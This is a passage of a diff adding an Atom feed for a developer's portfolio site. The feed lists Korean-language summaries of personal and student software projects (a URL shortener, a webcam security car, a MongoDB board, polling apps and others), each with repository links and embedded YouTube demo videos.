+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/jZepehJrm70?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;	
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2014/09/01/[13]URLShortener</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2014/09/01/%5B13%5DURLShortener.html"/>
+        <title>URLShortener</title>
+        <updated>2014-09-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2014/09/01/%5B13%5DURLShortener.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;Redis 및 Mysql Dump BackUp을 이용한 URL 축약 웹서비스입니다. URL을 입력하면, 짧은 버전의 URL을 반환하고, 해당 URL접근시 원본 URL로 리다이렉트 시켜 주는 기능을 합니다. Redis에 저장된 데이터는 Linux Cron Job을 통해 주기적으로 RDBMS (Mysql)로 백업됩니다.
+Python을 이용해서 for문을 돌며 redis의 데이터를 mysql로 옮기는 기능을 구현 했으나, 성능상 좋아보이지 않아 redis의 dump파일을 mysql에 dump insert하기 위한 기능을 구현했습니다. redis에서 csv로 백업해 주는 기능이 없어서 redis-client.c 파일을 수정해서 원하는 기능을 구현했습니다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/URLShortener&quot;&gt;소스저장소&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/SnDClysgZrk?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;	
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2014/08/01/[6]Todo_List</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2014/08/01/%5B6%5DTodo_List.html"/>
+        <title>Todo List</title>
+        <updated>2014-08-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2014/08/01/%5B6%5DTodo_List.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;기본 Template이 작성되어있는 오픈소스 프로젝트에서 학습을 위한 vanila Javascript 및 CSS3, HTML5 등을 적용한 프로젝트입니다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/TODOLIST&quot;&gt;소스저장소&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/zSzc61DDYMY?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;	
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2014/08/01/[5]HomeSecurityManager</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2014/08/01/%5B5%5DHomeSecurityManager.html"/>
+        <title>Home Security Manager</title>
+        <updated>2014-08-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2014/08/01/%5B5%5DHomeSecurityManager.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;실시간 웹캠을 폐스마트폰을 이용해 구현한 프로젝트입니다. 폐스마트폰에는 아두 이노 자동차가 연결되어 있으며 동시에 웹서버 역할을 합니다.
+웹서버를 통해 서비스되는 웹페이지에서 직접 아두이노 자동차를 움직여 원하는 장소 어디든지 실시간 CCTV 영상을 확인할 수 있는끔 구현한 장치입니다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/HomeSecurityManager&quot;&gt;소스저장소&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/U_dBE1CPxpM?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/3lMKViLAEqo&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2014/08/01/[12]MongoLog</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2014/08/01/%5B12%5DMongoLog.html"/>
+        <title>MongoLog</title>
+        <updated>2014-08-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2014/08/01/%5B12%5DMongoLog.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;Database Advanced 수업에서 Mongo DB를 학습하기 위해 수행했던 프로젝트입니다. 간단한 게시판 기능을 구현했습니다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/MongoLog&quot;&gt;소스저장소&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/GDqSw_uS0Mc?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;	
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2014/07/01/[11]Galaxy_War</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2014/07/01/%5B11%5DGalaxy_War.html"/>
+        <title>Galaxy War</title>
+        <updated>2014-07-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2014/07/01/%5B11%5DGalaxy_War.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;Database sharding을 실습한 프로젝트입니다. 4개의 은하가 전쟁을 하는 컨셉으로, 각각의 은하에 속한 전함(총 100만대)들이 끊임 없이 상대 은하들을 공격하는 프로그램입니다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/GalaxyWar&quot;&gt;소스저장소&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/o1dQir3gU-M-M?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;	
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2014/03/01/[3]Neighbor</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2014/03/01/%5B3%5DNeighbor.html"/>
+        <title>Neighbor</title>
+        <updated>2014-03-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2014/03/01/%5B3%5DNeighbor.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;지도 위에 채팅방을 열어 익명의 사용자들과 대화를 나눌 수 있는 서비스입니다. 총 4명의 팀원이 2014년 3월부터 약 4개월간 진행했고, 개발 환경 설정부터 데모 동영상 제 작까지 개발의 전체 사이클을 경험할 수 있었던 프로젝트입니다. 개발 능력 향상을 위하여 팀원 모두가 back, front 구분없이 함께 스터디하며 개발하였습니다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;팀원들과 공유하기위해 만든 서버 설정문서&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;iframe src=&quot;//www.slideshare.net/slideshow/embed_code/key/5NqBUiM4zPBpbH&quot; width=&quot;595&quot; height=&quot;485&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot; allowfullscreen=&quot;&quot;&gt; &lt;/iframe&gt;
+&lt;div style=&quot;margin-bottom:5px&quot;&gt; &lt;strong&gt; &lt;a href=&quot;//www.slideshare.net/ssuserdaba75/ss-32520625&quot; title=&quot;자바 웹프로젝트 개발환경 셋팅&quot; target=&quot;_blank&quot;&gt;자바 웹프로젝트 개발환경 셋팅&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a href=&quot;//www.slideshare.net/ssuserdaba75&quot; target=&quot;_blank&quot;&gt;윤성 정&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/NHNNEXT/2014-01-HUDI-ROLLINGPUPPY&quot;&gt;소스저장소&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/2lzZwuKNtUo?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2014/01/10/[2]NextPortal</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2014/01/10/%5B2%5DNextPortal.html"/>
+        <title>NextPortal</title>
+        <updated>2014-01-10T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2014/01/10/%5B2%5DNextPortal.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;비공개 프로젝트입니다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2013/09/01/[8]CozyHome</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2013/09/01/%5B8%5DCozyHome.html"/>
+        <title>Cozy Home</title>
+        <updated>2013-09-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2013/09/01/%5B8%5DCozyHome.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;Instagram과 동일한 방식으로 동작하는 사진 업로드 서비스입니다. 기능으로는 회원가입, 로그인, 사진촬영, 사진 불러오기, 사진 업로드, 사진 편집, 댓글 달기가 있습니 다.
+NEXT의 Human Design Project에서 Top-Down방식으로 시도된 수업의 프로 젝트였으며 웹서비스의 전체과정을 경험한 최초의 웹서버 프로젝트입니다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/CozyHome&quot;&gt;소스저장소_서버&lt;/a&gt;
+&lt;a href=&quot;https://github.com/YoonSung/CozyHome-IOS&quot;&gt;소스저장소_IOS&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/vamlVV5XAxA?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;	
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2013/09/01/[7]NewsStand</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2013/09/01/%5B7%5DNewsStand.html"/>
+        <title>네이버 뉴스 스탠드</title>
+        <updated>2013-09-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2013/09/01/%5B7%5DNewsStand.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;HTML, CSS, Javascript을 처음 접하며, 학습을 위해 2013년 당시 네이버 ‘뉴스 스탠드’ 서비스를 모사한 프로젝트입니다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/NewsStand&quot;&gt;소스저장소&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/vPqEcY9riRw?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;	
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2012/04/01/[15]이슈&뉴스</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2012/04/01/%5B15%5D%EC%9D%B4%EC%8A%88&%EB%89%B4%EC%8A%A4.html"/>
+        <title>이슈 & 뉴스</title>
+        <updated>2012-04-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2012/04/01/%5B15%5D%EC%9D%B4%EC%8A%88&%EB%89%B4%EC%8A%A4.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;두잇서베이에서 제공하던 “이슈 &amp;amp; 뉴스 POLL”이라는 서비스를 활용한 프로젝트입니다. 해당 서비스는 누구나 참여하고 결과를 확인할 수 있는 공개투표였으며, 그 결과는 보도자료로 활용하고 있었습니다.
+두잇서베이의 자체어플리케이션에 탑재되어 있는 메뉴였지만, 일반 대중들에게 제공되는 어플리케이션을 구상하여 개발하였습니다.
+해당 어플리케이션은 안드로이드 마켓에서 확인하실 수 있습니다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/Issue-News.git&quot;&gt;소스저장소&lt;/a&gt;
+	&lt;a href=&quot;https://play.google.com/store/apps/details?id=com.DooitResearch.issueNnews&quot;&gt;안드로이드마켓&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/H_q05wzmeSQ?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;	
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2012/01/01/[14]모바일_무료투표</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2012/01/01/%5B14%5D%EB%AA%A8%EB%B0%94%EC%9D%BC_%EB%AC%B4%EB%A3%8C%ED%88%AC%ED%91%9C.html"/>
+        <title>모바일 무료투표</title>
+        <updated>2012-01-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2012/01/01/%5B14%5D%EB%AA%A8%EB%B0%94%EC%9D%BC_%EB%AC%B4%EB%A3%8C%ED%88%AC%ED%91%9C.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;카카오톡을 이용하며 단체채팅의 의사결정을 돕고 설문조사에 대한 접근성을 높이기 위하여 어플리케이션을 개발하였습니다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/KakaoPoll.git&quot;&gt;소스저장소&lt;/a&gt;
+	&lt;a href=&quot;https://play.google.com/store/apps/details?id=com.DooitResearch.kakaoPoll&quot;&gt;안드로이드마켓&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/0uM8rs4g2yI?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;	
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+
+</feed>
